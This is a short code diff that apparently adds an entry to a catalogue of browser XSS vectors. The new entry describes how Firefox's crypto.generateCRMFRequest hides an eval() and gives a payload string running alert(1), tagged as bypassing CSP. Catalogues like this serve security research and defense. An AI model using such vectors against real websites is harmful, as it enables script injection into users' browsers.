@@ -53,6 +53,20 @@
             },
             'tags'       : ['xss', 'dom', 'ff', 'worker'],
             'reporter'   : '.mario'
+        },
+        { /* ID 5 - Firefox crypto object - hidden eval() */
+            'id'         : 5, 
+            'category'   : 'dom', 
+            'name'       : 'Firefox crypto object - hidden eval()',
+            'data'       : 'crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'alert(1)\',384,null,\'rsa-dual-use\')',
+            'description': 'This vector uncovers a hidden eval() inside the Firefox crypto object',
+            'browsers'   : {
+                'firefox': [
+                    '2.x', '3.x', '3.5', '3.6', '3.7'
+                ]
+            },
+            'tags'       : ['xss', 'dom', 'ff', 'crypto', 'eval', 'csp'],
+            'reporter'   : '.mario'
         }
     ]        
 }
